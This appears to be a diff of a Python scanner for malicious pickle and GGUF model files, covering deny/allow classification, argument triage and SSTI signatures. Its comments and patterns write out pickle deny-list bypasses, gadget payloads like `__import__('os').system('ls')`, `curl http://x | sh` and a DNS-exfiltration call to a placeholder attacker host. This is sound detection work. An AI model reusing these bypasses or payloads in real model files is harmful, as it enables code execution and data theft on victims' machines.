-    do not -- a bare `startswith` would deny anything merely beginning with
-    those letters.
-    """
-    for module in _PICKLE_DENIED_MODULES:
-        if ref == module or ref.startswith(module + "."):
-            return True
-    return False
-
-
-def _classify_pickle_global(ref: str) -> str:
-    """Classify a resolved `module.name` global as denied/allowed/unknown."""
-    if ref in PICKLE_DENIED_GLOBALS:
-        return "denied"
-    # Allow-list wins over the module wildcard: `torch.serialization._get_layout`
-    # and the numpy rebuild helpers are legitimate members of otherwise
-    # uninteresting modules, and none of the wildcarded modules overlaps the
-    # allow list today -- but the ordering makes that safe if one ever does.
-    if ref in PICKLE_ALLOWED_GLOBALS or _is_ml_constructor_allowed(ref):
-        return "allowed"
-    if _is_denied_pickle_module(ref):
-        return "denied"
-    module, _, name = ref.rpartition(".")
-    if module in _PICKLE_ALLOWED_STORAGE_PARENTS and _PICKLE_STORAGE_NAME_RE.match(name):
-        return "allowed"
-    root = module.partition(".")[0]
-    if root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and _PICKLE_ML_CLASS_NAME_RE.match(name):
-        return "allowed"
-    return "unknown"
-
-
-def _laundered_denied_ref(qualname: str) -> str | None:
-    """The denied callable a dotted GLOBAL *name* reaches by attribute walk.
-
-    A deny list keyed on the joined `module.name` string is bypassed by moving
-    the interesting half into the name. CPython's `Unpickler.find_class`, for
-    protocol 4 and above, resolves the name with `pickle._getattribute`, which
-    splits on "." and getattrs each segment in turn. So
-
-        GLOBAL "torch.serialization" "os.system"
-
-    resolves to `os.system` on load, while the joined ref this walk records is
-    `torch.serialization.os.system`, which is on no list and lands in the
-    unknown bucket. Any module that does `import os` works as the prefix --
-    logging, shutil, zipfile, pathlib, tarfile and platform all do -- so the
-    supply of benign-looking prefixes is effectively unlimited and no amount of
-    adding names to the deny list closes it.
-
-    Every tail of the qualname is reachable, not just the whole of it, because
-    the walk is per-segment: `_getattribute(os, "path.os.system")` succeeds the
-    same way. The module half is not traversed (it is a single `sys.modules`
-    lookup), so tails starting inside it are not candidates.
-
-    Returns the first tail that is already denied, or None. Deliberately
-    narrow: nothing is reported unless it resolves to something the deny list
-    already covers, so a benign dotted qualname such as a nested class
-    `Outer.Inner` is unaffected. Not gated on the protocol byte -- a dotted
-    name that spells a denied callable is evidence of intent even in a
-    protocol-2 stream where it would fail to load.
-    """
-    if "." not in qualname:
-        return None
-    parts = qualname.split(".")
-    for i in range(len(parts) - 1):
-        candidate = ".".join(parts[i:])
-        if _classify_pickle_global(candidate) == "denied":
-            return candidate
-    return None
-
-
-# ── Unknown-bucket re-triage ────────────────────────────────────────
-#
-# An unknown global is one that is on neither list, and that bucket is where
-# every publicly documented picklescan bypass lands: `torch.utils.collect_env
-# .run` (CVE-2025-71350), `pip.main` (CVE-2025-1716), `linecache`/`ssl` used
-# for DNS exfiltration (CVE-2025-46417), `builtins.getattr` and
-# `operator.attrgetter` chains. Reporting all of them at INFO with the words
-# "likely a legitimate custom class" put the working bypasses in the tier
-# triagers suppress -- the allow/deny/unknown split was doing its job and the
-# severity assignment was throwing the result away.
-#
-# The re-triage below deliberately keys on *evidence*, not on names, because a
-# new list of bad names would inherit the same completeness problem that
-# created this gap. Every signal reads the resolved call arguments -- what the
-# callable would actually be invoked with -- which the opcode walk already
-# recovers. Nothing reads the callable's own name.
-#
-# Note what is deliberately NOT a signal: whether the global is invoked at all.
-# That was the obvious first cut, and it does not work -- a benign pickle
-# containing any custom class produces `mypackage.MyModel()` as a resolved
-# call just as surely as a gadget does, so escalating on invocation alone
-# would escalate essentially every model file with a custom class in it.
-# Invocation is a precondition for the argument signals, not evidence itself.
-
-_PICKLE_ARG_URL_RE = re.compile(r"\b[a-z][a-z0-9+.\-]{1,15}://", re.I)
-# A shell metacharacter adjacent to whitespace, i.e. used as an operator
-# rather than merely present. `curl http://x | sh` matches; an ordinary
-# value like `a;b` or a base64 blob containing `+/=` does not.
-_PICKLE_ARG_SHELL_RE = re.compile(r"\$\(|`|\s[;&|]|[;&|]\s")
-# Callables that rebuild a code object or a function from its parts. Every
-# code object carries co_filename, the absolute path of the source it was
-# compiled from, so a path argument here is structural metadata rather than a
-# choice the pickle's author made. Measured on SafePickle's benign half: 81 of
-# 644 real models were promoted to a LOW finding on strings like
-# "/nfs/staff-hdd/.../site-packages/timm/layers/conv2d_same.py".
-#
-# The same applies to the identifier arguments. dill and cloudpickle serialise
-# a function together with the names its body references, so a function that
-# calls compile() or open() carries those names as data. Reading them as a
-# getattr/attrgetter chain resolving a denied callable is the same mistake as
-# reading co_filename as a chosen path: 80 more of SafePickle's 644 benign
-# models were promoted this way.
-#
-# Suppressed for these callables: the path signal and the attribute-name
-# signal. Still promoting: a URL, a shell-shaped string, a (host, port) pair,
-# and a literal that is Python *source* resolving a denied callable. None of
-# those is anything a code object carries by construction, and the real sink
-# in a dill-based gadget is still reached by MFV-PICKLE-001.
-_PICKLE_CODE_OBJECT_BUILDERS: frozenset[str] = frozenset({
-    "dill._dill._create_code",
-    "dill._dill._create_function",
-    "dill._dill._create_type",
-    "cloudpickle.cloudpickle._make_function",
-    "cloudpickle.cloudpickle._make_skel_func",
-    "cloudpickle.cloudpickle._builtin_type",
-    "types.CodeType",
-    "types.FunctionType",
-    "marshal.loads",
-})
-
-
-# Callables whose first argument is a pattern, not a command. A regex is dense
-# with the same characters a shell line uses (| ^ $ ( ) . *), so running the
-# command-shape patterns over one measures how complex the regex is. 40 of
-# SafePickle's benign models were promoted on tokeniser patterns like
-# "^§|^%|^=|^—|^–|^\\+(?![0-9])".
-_PICKLE_PATTERN_ARG_CALLABLES: frozenset[str] = frozenset({
-    "re._compile", "re.compile", "regex._compile", "regex.compile",
-})
-
-
-_PICKLE_ARG_PATH_RE = re.compile(r"^(?:/|~/|[A-Za-z]:[\\/])|\.\.[\\/]")
-_PICKLE_ARG_HOSTNAME_RE = re.compile(
-    r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9\-]+$"
-)
-
-# Attribute names of the callables already on the deny list, e.g. "system"
-# from "os.system". An unknown callable handed one of these as a literal
-# string is the shape of a `getattr(module, "system")` / `attrgetter("system")`
-# chain resolving a denied callable dynamically -- the exact move that keeps
-# the denied name out of the opcode stream where a deny list would see it.
-# Derived from the existing deny list rather than written out fresh, so it
-# carries no new completeness debt.
-#
-# This started as a length rule (keep dunders and names of 6+ characters) on
-# the theory that short names are ordinary English and would fire on benign
-# arguments. That was exactly backwards for the names that matter: it dropped
-# `eval`, `exec`, `popen`, `fork`, `spawn` and `CDLL` -- the canonical targets
-# of `getattr(module, "eval")`, which is the chaining technique Slaviero
-# documented in 2011 and every guide since has repeated. Length was a proxy
-# for "reads as an ordinary word"; the proxy is now replaced by naming the
-# handful of entries that genuinely do.
-_PICKLE_GENERIC_ATTR_NAMES: frozenset[str] = frozenset({
-    # Ordinary vocabulary that plausibly appears as a literal string in
-    # legitimate model metadata (a stage name, a mode, a config value).
-    "run", "call", "get", "load", "loads", "open", "apply", "remove", "start",
-})
-_PICKLE_DENIED_ATTR_NAMES: frozenset[str] = frozenset(
-    name
-    for name in (ref.rpartition(".")[2] for ref in PICKLE_DENIED_GLOBALS)
-    if name not in _PICKLE_GENERIC_ATTR_NAMES
-)
-
-
-# Allowlisted callables that legitimately receive a string argument. Everything
-# else on the allow list reconstructs a container, a tensor or a dtype from
-# structural data and never takes free text.
-#
-# This is a *type contract*, not a badness list, and it is complete over
-# PICKLE_ALLOWED_GLOBALS because that list is ours. That completeness is the
-# point: a badness list cannot be complete, but "which of my own 25 allowlisted
-# entries accept a string" can be.
-_PICKLE_ALLOWED_STRING_ARG_OK: frozenset[str] = frozenset({
-    "_codecs.encode",                    # _codecs.encode('\\xe9', 'latin1')
-    "numpy.dtype",                       # numpy.dtype('f8')
-    "torch.serialization._get_layout",   # torch.serialization._get_layout('torch.strided')
-    "torch.device",                      # torch.device('cuda', 0): device names are strings
-    # numpy.core.multiarray._reconstruct('numpy.ndarray', shape, dtype) is how
-    # every ndarray pickled under protocols 0/1 reduces: the subtype arrives as
-    # a *string*, not a global ref. Any numpy-bearing pickle old enough to be
-    # in text form carries exactly this call, so the string-argument premise is
-    # false at the source for this one callable. Both module spellings appear
-    # in the wild (numpy < 2 vs >= 2). An attacker who has trojaned numpy gains
-    # nothing extra from the string: _reconstruct is already theirs to abuse.
-    "numpy.core.multiarray._reconstruct",
-    "numpy._core.multiarray._reconstruct",
-    # Same era, same shape: scalar(dtype_code, bytes) pickled under protocols
-    # 0/1 carries the dtype as a string code ('i8', 'f8'). Measured on a real
-    # sklearn StandardScaler from the quickset benign corpus.
-    "numpy.core.multiarray.scalar",
-    "numpy._core.multiarray.scalar",
-})
-
-
-def _allowed_call_has_anomalous_string(ref: str, call: PickleResolvedCall | None) -> str | None:
-    """Return a reason if an allowlisted callable is handed free text it has no
-    legitimate use for, else None.
-
-    This is what catches ShadowPickle's Overwritten Module variant, which is
-    reported at 63% evasion and 0% detection by both picklescan and ModelScan.
-    That attack never names anything dangerous: it calls
-    `collections.OrderedDict("ls -la")` and relies on a trojaned `collections`
-    in the victim environment to execute the string.
-
-    Deliberately a shape check rather than a content check. The payloads in
-    that work include `ls -la` and multi-line Python source, neither of which
-    trips the URL, shell-metacharacter or leading-path patterns used elsewhere
-    in this module -- and chasing those patterns would be an arms race over
-    string contents. What does not vary is that a mapping or tensor
-    reconstructor has no reason to receive free text at all, whatever that
-    text says.
-    """
-    if call is None or ref in _PICKLE_ALLOWED_STRING_ARG_OK:
-        return None
-    texts = [
-        text
-        for text in (
-            _pickle_arg_text(v)
-            for v in _iter_pickle_arg_values((call.args, call.kwargs or {}))
-        )
-        if text
-    ]
-    if not texts:
-        return None
-    longest = max(texts, key=len)
-    return (
-        f"is allowlisted but is invoked with a string argument "
-        f"({_PICKLE_ARG_REPR.repr(longest)}), which it has no legitimate use for"
-    )
-
-
-# Upper bound on an argument string this walk is willing to hand to
-# `ast.parse`. Parsing is the one place a *value* (not merely its shape)
-# drives real work, and these bytes are attacker-chosen; a megabyte of
-# pathological nesting is cheap to write and not cheap to parse. Real
-# one-liner payloads are tens of characters, so the bound costs no recall.
-_PICKLE_MAX_SOURCE_PARSE_BYTES = 4096
-
-
-def _iter_pickle_source_targets(text: str):
-    """Yield every dotted callable name `text` would resolve if executed as
-    Python.
-
-    This generalises the existing "argument names a denied global" check from
-    an exact string match to the language's own grammar. That check compares
-    the whole argument against the classifier, so it sees ``'os.system'`` but
-    not ``"__import__('os').system('ls')"`` -- and the second is what an
-    eval-family gadget is actually handed, because the gadget needs an
-    expression, not a name.
-
-    The mechanism is unchanged and no new list appears: the caller re-runs
-    `_classify_pickle_global` over what comes out of here. What changes is
-    that the target is recovered through Python syntax instead of requiring
-    the attacker to have written it bare. The interchangeable part is the
-    evaluator (`sympify`, `eval_expr`, `lambdify`, a logging config's
-    ``class=``, an `sT` repr round-trip); the part that cannot vary is that
-    the source names something that executes.
-    """
-    if len(text) > _PICKLE_MAX_SOURCE_PARSE_BYTES or "(" not in text:
-        # No call syntax means no callable is resolved, whatever else the
-        # string parses to. Bare dotted names are already covered by the
-        # exact-match check, and requiring a parenthesis keeps ordinary
-        # metadata out of the parser entirely.
-        return
-    try:
-        tree = ast.parse(text)
-    except (SyntaxError, ValueError, MemoryError, RecursionError):
-        # Not Python. By far the common case for a benign string, and the
-        # reason this is safe to run over every argument.
-        return
-
-    def dotted(node: Any) -> str | None:
-        """Reconstruct the dotted name a value-expression denotes, or None."""
-        if isinstance(node, ast.Name):
-            return node.id
-        if isinstance(node, ast.Attribute):
-            base = dotted(node.value)
-            return f"{base}.{node.attr}" if base else None
-        if isinstance(node, ast.Call):
-            # `__import__('os')` and `importlib.import_module('os')` denote
-            # the module they name, which is what makes
-            # `__import__('os').system` reconstruct as `os.system`. Handled
-            # inside the recursion so it composes with attribute access at
-            # any depth rather than being a top-level special case.
-            func = dotted(node.func)
-            if func in ("__import__", "importlib.import_module") and node.args:
-                first = node.args[0]
-                if isinstance(first, ast.Constant) and isinstance(first.value, str):
-                    return first.value
-            return func
-        return None
-
-    for node in ast.walk(tree):
-        if isinstance(node, ast.Call):
-            name = dotted(node.func)
-            if name:
-                yield name
-        elif isinstance(node, ast.Import):
-            for alias in node.names:
-                yield alias.name
-        elif isinstance(node, ast.ImportFrom):
-            if node.module:
-                for alias in node.names:
-                    yield f"{node.module}.{alias.name}"
-
-
-def _pickle_source_denied_target(text: str) -> str | None:
-    """Return the first denied callable `text` would resolve as Python, if any."""
-    for name in _iter_pickle_source_targets(text):
-        if _classify_pickle_global(name) == "denied" or _is_denied_pickle_module(name):
-            return name
-    return None
-
-
-def _iter_pickle_arg_values(value: Any, _seen: set[int] | None = None):
-    """Yield every scalar nested anywhere inside a resolved argument value.
-
-    Recurses over container depth an attacker controls (nested TUPLE1 opcodes),
-    and unlike the opcode walk this runs outside `_scan_pickle`'s try/except,
-    so a RecursionError here would escape rather than degrade. It cannot reach
-    one: `_is_pickle_literal` walks the identical structure first, from deeper
-    in the stack inside `_resolve_pickle_globals`, so any nesting deep enough
-    to overflow is rejected before a call is ever recorded (verified
-    exhaustively over nesting depths 1..699 -- the limit trips at ~500 and
-    always inside the guarded walk). Keep that ordering if either is moved.
-
-    Shared containers are visited once, for the same reason `_is_pickle_literal`
-    memoizes: `DUP` makes the simulated stack a DAG, and re-walking shared
-    subtrees turns a 73-byte file into exponential work. A value that appears
-    twice adds no evidence the first occurrence did not already provide.
-    """
-    if _seen is None:
-        _seen = set()
-    if isinstance(value, (tuple, list, set, frozenset, dict)):
-        marker = id(value)
-        if marker in _seen:
-            return
-        _seen.add(marker)
-    if isinstance(value, (tuple, list, set, frozenset)):
-        for item in value:
-            yield from _iter_pickle_arg_values(item, _seen)
-    elif isinstance(value, dict):
-        for key, item in value.items():
-            yield from _iter_pickle_arg_values(key, _seen)
-            yield from _iter_pickle_arg_values(item, _seen)
-    else:
-        yield value
-
-
-def _pickle_arg_text(value: Any) -> str | None:
-    """Return `value` as text if it is a string, or bytes that are entirely
-    printable ASCII; otherwise None.
-
-    A `_PickleGlobalRef` is excluded first: it is a resolved class reference
-    (an object), not free text, whatever its string rendering suggests. The
-    printability gate matters: binary argument blobs are routine in real
-    pickles (`datetime.datetime(b'\\x07\\xe4\\x01\\x01...')` is the canonical
-    one) and raw bytes contain `|`, `;` and `&` constantly. Running the
-    command-shape patterns over decoded binary would turn every pickled
-    datetime into a HIGH finding.
-    """
-    if isinstance(value, _PickleGlobalRef):
-        return None
-    if isinstance(value, str):
-        return value
-    if isinstance(value, (bytes, bytearray)):
-        try:
-            text = value.decode("ascii")
-        except UnicodeDecodeError:
-            return None
-        return text if text.isprintable() else None
-    return None
-
-
-def _iter_pickle_host_port_pairs(value: Any, _seen: set[int] | None = None):
-    """Yield every ``(hostname, port)``-shaped 2-tuple nested in `value`.
-
-    Structural rather than name-based: a dotted hostname paired with an
-    integer in port range is the socket-address literal, which is how the
-    DNS-exfiltration gadgets are parameterized
-    (``ssl.get_server_certificate(("<exfil>.attacker.tld", 443))``).
-    """
-    if _seen is None:
-        _seen = set()
-    if isinstance(value, (tuple, list, dict)):
-        marker = id(value)
-        if marker in _seen:
-            return
-        _seen.add(marker)
-    if isinstance(value, dict):
-        for item in value.values():
-            yield from _iter_pickle_host_port_pairs(item, _seen)
-    elif isinstance(value, (tuple, list)):
-        if (
-            len(value) == 2
-            and isinstance(value[0], str)
-            and isinstance(value[1], int)
-            and not isinstance(value[1], bool)
-            and 0 < value[1] <= 65535
-            and _PICKLE_ARG_HOSTNAME_RE.match(value[0])
-        ):
-            yield value[0], value[1]
-        for item in value:
-            yield from _iter_pickle_host_port_pairs(item, _seen)
-
-
-# A pickle stream begins with a PROTO opcode (protocols 2 and up) or one of
-# the handful of opcodes a protocol-0 or -1 stream can open with.
-_NESTED_PICKLE_OPENERS = (b"\x80", b"(", b"]", b"}", b"c", b"\x8c", b"\x95")
-
-
-def _nested_pickle_globals(blob: bytes) -> list[str] | None:
-    """Globals referenced by a pickle stream carried inside a bytes literal.
-
-    Resolution is delegated to the same walker the outer stream uses, so
-    STACK_GLOBAL and the memo behave identically one level down. A hand-rolled
-    opcode scan here saw only ``<stack_global>`` and missed every protocol-4
-    payload, which is most of them.
-    """
-    if not isinstance(blob, (bytes, bytearray)) or len(blob) < 4:
-        return None
-    if bytes(blob[:1]) not in _NESTED_PICKLE_OPENERS:
-        return None
-    try:
-        names, _calls, _memo = _resolve_pickle_globals(bytes(blob))
-    except Exception:                                    # noqa: BLE001
-        return None
-    return sorted(names) or None
-
-
-def _embedded_pickle_denied_globals(data: bytes) -> list[str]:
-    """Denied callables hiding in a pickle stream carried as a bytes literal.
-
-    `numpy.load(BytesIO(<pickle>))` is the published shape. numpy.load is on
-    nobody's deny list, the outer stream contains no URL or shell string, and
-    the payload only exists once the inner bytes are themselves unpickled.
-    Any loader handed those bytes will read them, so this scanner reads them
-    too, one level down.
-
-    Deliberately narrow: only inner streams referencing an already-denied
-    callable are reported. A nested pickle on its own is unusual rather than
-    dangerous, and reporting merely unusual structure is how a scanner starts
-    flagging real models.
-    """
-    found: list[str] = []
-    try:
-        ops = list(pickletools.genops(io.BytesIO(data)))
-    except Exception:                                    # noqa: BLE001
-        return found
-    for op, arg, _pos in ops:
-        if op.name not in ("SHORT_BINBYTES", "BINBYTES", "BINBYTES8"):
-            continue
-        nested = _nested_pickle_globals(arg if isinstance(arg, bytes) else b"")
-        for name in nested or ():
-            if _classify_pickle_global(name) == "denied":
-                found.append(name)
-    return sorted(set(found))
-
-
-def _triage_unknown_pickle_call(
-    call: PickleResolvedCall | None,
-) -> tuple[Severity, str] | None:
-    """Re-triage one unknown global against the argument-level evidence the
-    opcode walk resolved for it, returning ``(severity, reason)`` or None to
-    leave it in the INFO bucket.
-
-    Takes only the resolved call, not the global's name: after measuring the
-    module-identity tier against real pickles (see the note above), every
-    surviving signal reads the arguments and nothing reads the callable's
-    name. That is the intended shape -- a verdict derived from the name is a
-    deny list, and a deny list is what the bypass gadgets are designed to
-    walk past.
-
-    Ordered strongest evidence first; the first match wins.
-    """
-    if call is None:
-        # Referenced but never invoked, or invoked with arguments that could
-        # not be resolved to literals. No evidence to act on -- the scanner
-        # does not guess at values it cannot verify.
-        return None
-
-    # A code object carries its source path in co_filename, so the path signal
-    # says nothing about this call. Every other signal still applies.
-    is_code_builder = call.ref in _PICKLE_CODE_OBJECT_BUILDERS
-    takes_pattern = call.ref in _PICKLE_PATTERN_ARG_CALLABLES
-
-    if call.partial_texts:
-        # Only some arguments resolved. The text signals below still apply --
-        # a literal is a literal wherever it sat in the argument list -- but
-        # the (host, port) check below is skipped, because it reasons about
-        # tuple *structure* that this call, by definition, does not have.
-        texts = list(call.partial_texts)
-        arguments: Any = ()
-    else:
-        arguments = (call.args, call.kwargs or {})
-        texts = [
-            text
-            for text in (_pickle_arg_text(v) for v in _iter_pickle_arg_values(arguments))
-            if text is not None
-        ]
-
-    for text in texts:
-        if takes_pattern:
-            # The argument is a regular expression by the callable's contract.
-            continue
-        if _PICKLE_ARG_URL_RE.search(text):
-            return (Severity.HIGH, "invoked with a URL argument")
-        if _PICKLE_ARG_SHELL_RE.search(text) or (text.startswith("/") and " " in text.strip()):
-            return (Severity.HIGH, "invoked with a shell-command-shaped argument")
-
-    if next(_iter_pickle_host_port_pairs(arguments), None) is not None:
-        return (Severity.HIGH, "invoked with a network endpoint (host, port) argument")
-
-
-    for text in texts:
-        # A literal string that *names* something denied, handed to some other
-        # callable. This is dynamic resolution in its general form, and the
-        # check needs no list of its own: it re-runs the existing
-        # classification over the argument instead of over a resolved global.
-        #
-        # It is the answer to automatically-discovered gadgets. PickleCloak
-        # mines the stdlib for dotted-name resolvers and finds ones nobody has
-        # listed -- `logging.config._resolve`, `unittest.mock._dot_lookup`,
-        # `xmlrpc.server.resolve_dotted_attribute`,
-        # `sympy.utilities.source.get_class` -- but every one of them is handed
-        # the same `'os.system'`, because the *resolver* is interchangeable and
-        # the *target* is not. Keying on the target rather than the resolver is
-        # what stops this being a list-maintenance race.
-        if _classify_pickle_global(text) == "denied" or _is_denied_pickle_module(text):
-            return (
-                Severity.HIGH,
-                f"is invoked with {text!r}, which names a callable this scanner denies -- "
-                f"the shape of a dynamic-resolution gadget, where an innocuous-looking "
-                f"resolver is handed the dangerous target as data",
-            )
-        # The same test, read through Python's grammar rather than off the
-        # bare string: an argument that is *source code* naming a denied
-        # callable. Same classifier, same reasoning, wider aperture -- see
-        # `_iter_pickle_source_targets`.
-        source_target = _pickle_source_denied_target(text)
-        if source_target is not None:
-            return (
-                Severity.HIGH,
-                f"is invoked with {_PICKLE_ARG_REPR.repr(text)}, which is Python source "
-                f"resolving {source_target!r}, a callable this scanner denies -- the shape "
-                f"of an eval-family gadget, where the evaluator is interchangeable and only "
-                f"the target it is handed matters",
-            )
-        if text in _PICKLE_DENIED_ATTR_NAMES and not is_code_builder:
-            return (
-                Severity.MEDIUM,
-                f"invoked with {text!r}, the attribute name of a known code-execution "
-                f"callable -- the shape of a getattr/attrgetter chain resolving it dynamically",
-            )
-
-    # The three-link gadget chain, keyed purely on the shape of the call graph
-    # and on no name anywhere in it:
-    #
-    #   1. some call produces an object,
-    #   2. this call consumes that object together with a literal identifier,
-    #   3. and this call's own result is then *invoked*.
-    #
-    # That is dynamic member resolution followed by a call: build an object,
-    # name a member on it with a string, invoke what comes back. The dangerous
-    # attribute never appears in the opcode stream, so the global walk has
-    # nothing to resolve and no list can help.
-    #
-    # All three links are required, and link 3 is what makes it safe. Links 1
-    # and 2 alone are not rare enough: a legitimate `__reduce__` returning
-    # `(Outer, (inner_obj, 'field_name'))` has exactly that shape and is a
-    # plausible thing for a real library to do -- it was a measured false
-    # positive on a hand-built benign pickle before link 3 was added. What has
-    # no benign counterpart is the third link. Pickle's own protocol always
-    # names the callable operand of a REDUCE via GLOBAL/STACK_GLOBAL; a stream
-    # that instead calls a value it computed at load time is doing something
-    # the serialization format never needs to do.
-    #
-    # Neither end of the chain can be listed: PickleCloak's resolvers
-    # (`unittest.mock._dot_lookup`, `xmlrpc.server.resolve_dotted_attribute`,
-    # `lib2to3.fixer_util.attr_chain`) are mined automatically, and the targets
-    # (`save`, `read_file`, `to_string`, `_loads`) are ordinary method names
-    # that are dangerous only on the specific class just constructed. The edge
-    # between them is the only stable thing to key on.
-    #
-    # MEDIUM, matching the getattr/attrgetter tier above: this establishes that
-    # a member is being resolved dynamically and then called, not what it
-    # resolves to.
-    # Code-object builders are exempt, and they are the counterexample this
-    # comment worried about. `dill._create_function(_create_code(...),
-    # globals, '__name__', ...)` has all three links by construction: it
-    # consumes a code object, is handed the function's own name as a literal,
-    # and the function it returns is then called. Measured on SafePickle's
-    # benign half, that shape alone promoted 80 of 644 real models.
-    if call.chained_from and call.result_invoked and not is_code_builder:
-        identifiers = [t for t in texts if t.isidentifier()]
-        if identifiers:
-            return (
-                Severity.MEDIUM,
-                f"consumes the result of {call.chained_from[0]}(), is handed "
-                f"{identifiers[0]!r} as a literal, and its own result is then invoked -- the "
-                f"shape of a dynamic member lookup on a freshly constructed object, which "
-                f"keeps the resolved attribute out of the opcode stream entirely",
-            )
-
-    for text in texts:
-        if _PICKLE_ARG_PATH_RE.search(text) and not is_code_builder:
-            # Weak on its own -- `pathlib.PurePosixPath('/home/u/model.bin')`
-            # looks identical to `linecache.getline('/etc/passwd', 1)` at the
-            # opcode level, and a file read is not code execution either way.
-            # LOW is enough to clear the INFO tier that gets suppressed
-            # wholesale without overstating what the evidence shows.
-            #
-            # Deliberately still anchored at the start of the string. Relaxing
-            # it to "any whitespace-separated token is a path" was tried, to
-            # reach `getoutput('touch /tmp/liut')` where the path sits second;
-            # it promoted three more corpus files and false-positived on
-            # ordinary prose that mentions a path ("weights were loaded from
-            # /opt/models/base.bin"). The anchor is doing real work: a string
-            # that *begins* with a path is a path, while a string that merely
-            # contains one is usually a sentence. Separating the two needs a
-            # judgement about whether token 0 is a command name, which is a
-            # list of command names by another route.
-            return (Severity.LOW, "invoked with an absolute or traversing filesystem path argument")
-
-    return None
+# The pickle VM, classifier and triage moved to hayward._pickle_engine and
+# are re-exported at the top of this module. These two operand/memo budget
+# caps stay here because the suite monkeypatches them on the scanner module;
+# the VM reads them back off this module by attribute.
+# Cap on entries in the simulated memo dict itself. The index cap above bounds
+# the *profiling* set, but `memo[arg] = stack[-1]` grew a live dict alongside
+# it: 500MB of `N\x94` (NONE+MEMOIZE) is 250M entries and a multi-GB OOM fully
+# inside the default scan cap. Same bound and same 1000x-over-real-models
+# headroom as the index cap. On overflow the memo freezes (no new entries
+# recorded) and the walk continues: GLOBAL/STACK_GLOBAL detection does not
+# read the memo, so a frozen memo degrades resolution of later GETs, never
+# the verdict.
+_PICKLE_MEMO_MAX_ENTRIES = 1_000_000
+# Cap on the simulated operand stack. MARK/push bombs (`(` or `N` repeated to
+# the scan cap) grow it without bound otherwise. Entries are shared sentinels
+# or values already materialised from file bytes, so the bound is memory-safe;
+# 4M is ~200x deeper than the largest legitimate stream measured here (a
+# 20k-key dict pickled with MARK-based containers). On overflow the walk
+# terminates and the caller reports the unread remainder as a coverage gap --
+# a stream whose stack never fits is not the shape of a model file.
+_PICKLE_STACK_MAX_DEPTH = 4_000_000
+
+
+# Severity rank mirroring Finding.severity_order in findings.py (lower is
+# worse). Selecting the worst verdict by index into _PICKLE_UNKNOWN_TIERS
+# used to invert the result -- that dict inserts [HIGH, MEDIUM, LOW], so
+# max() by insertion index returned the LOWEST severity present.
+_SEVERITY_ORDER: dict[Severity, int] = {
+    Severity.CRITICAL: 0,
+    Severity.HIGH: 1,
+    Severity.MEDIUM: 2,
+    Severity.LOW: 3,
+    Severity.INFO: 4,
+}
 
 
 # Confidence and message lead per escalated tier, in emission order. Both are
@@ -1858,149 +256,6 @@ _PICKLE_UNKNOWN_TIERS: dict[Severity, tuple[float, str]] = {
 }
 
 
-# Code-execution/sandbox-escape constructs that distinguish a real SSTI
-# payload from ordinary Jinja2 variable substitution inside a chat_template.
-# Every legitimate chat-tuned model's template is full of "{{ }}" -- that's
-# just how Jinja2 spells a variable reference -- so presence of "{{" alone
-# is not a signal. What distinguishes a payload is Python object
-# introspection, sandbox escape, or a shell-out primitive appearing inside
-# the template.
-_GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES: tuple[str, ...] = (
-    "__globals__", "__class__", "__mro__", "__subclasses__",
-    "__builtins__", ".__init__.__globals__",
-    "os.", "subprocess.", "popen",
-)
-
-# The only parts of a Jinja2 template that execute: {{ expression }} and
-# {% statement %}. Prose outside these delimiters (and inside {# comments #})
-# is rendered verbatim, so signature-matching there measures vocabulary, not
-# behavior.
-_GGUF_JINJA_BLOCK_RE = re.compile(r"\{\{.*?\}\}|\{%.*?%\}", re.DOTALL)
-
-# String literals inside a Jinja block are data, not code: {{ 'scenarios.' }}
-# renders the text, it does not touch `os`. Real templates embed instructions
-# this way (measured: unsloth's DeepSeek-V4 template carries its system-prompt
-# prose inside a {{ '...' }} literal), so literals are blanked before the
-# signature match. {{ os.system('id') }} still matches via `os.` in code
-# position; {{ ''.__class__ }} still matches via `__class__`.
-_GGUF_JINJA_STRING_RE = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"")
-
-# ── GGUF metadata parsing ───────────────────────────────────────────
-#
-# Structure-aware KV parsing per the GGUF binary spec, instead of decoding
-# the raw file bytes and substring-matching across everything (which used to
-# match tensor names/binary weight data as readily as actual metadata, and
-# couldn't distinguish "this string is a metadata *value*" from "this byte
-# sequence just happens to appear somewhere in the file"). Only string and
-# string-array typed KV entries are materialized; every other type is
-# skipped by its known fixed/computed size so the offset stays correct
-# without needing to store values we don't check.
-
-GGUF_MAGIC = b"GGUF"
-
-# GGML is GGUF's predecessor and is still shipped: whisper.cpp publishes its
-# models in it, often under a .gguf name. Stored little-endian, its magic
-# 0x67676d6c reads as b"lmgg" on disk. Calling one of those "corrupted" is
-# wrong twice over, since the file is neither corrupt nor GGUF, and a hub
-# sweep found this was 10 of 17 actionable findings across 1,974 real files.
-GGML_MAGICS = (b"lmgg", b"fmgg", b"tjgg")   # ggml, ggmf, ggjt
-
-GGUF_METADATA_SCAN_BYTES = 10_000_000
-
-# Standard GGUF `general.*` keys documented as free-text/descriptive (per the
-# GGUF KV spec) -- exempt from the dangerous-substring content check below,
-# since ordinary prose in a description/author/license/tags field routinely
-# contains words like "subprocess" or "class" without being executable.
-_GGUF_FREETEXT_KEYS = frozenset({
-    "general.name", "general.description", "general.author",
-    "general.organization", "general.license", "general.license.name",
-    "general.url", "general.doi", "general.repo_url", "general.tags",
-    "general.languages", "general.datasets", "general.finetune",
-    "general.basename", "general.quantized_by", "general.size_label",
-    "general.source.url", "general.source.doi", "general.source.repo_url",
-    # tokenizer.ggml.tokens is the model's vocabulary: a list of arbitrary
-    # substrings harvested from training text, not metadata anyone wrote. A
-    # code-trained vocab necessarily contains tokens like "<class", "exec("
-    # and "__import__" (measured: unsloth's DeepSeek-V4 GGUFs trip three of
-    # the patterns below on vocab alone). Vocabulary is data, and no code
-    # path in a GGUF runtime executes it.
-    #
-    # The same argument covers the other tokenizer tables. merges is the BPE
-    # merge list, built from the same training text and equally certain to
-    # contain arbitrary substrings. A 2,456-file hub sweep found unsloth's
-    # gemma GGUFs tripping the "subprocess" pattern on merges alone, which is
-    # this exact false positive recurring on a different key. token_type and
-    # scores are numeric, and the chat template keeps its own dedicated check
-    # (MFV-GGUF-003), which looks for execution constructs rather than
-    # substrings.
-    "tokenizer.ggml.tokens",
-    "tokenizer.ggml.merges",
-    "tokenizer.ggml.token_type",
-    "tokenizer.ggml.scores",
-})
-
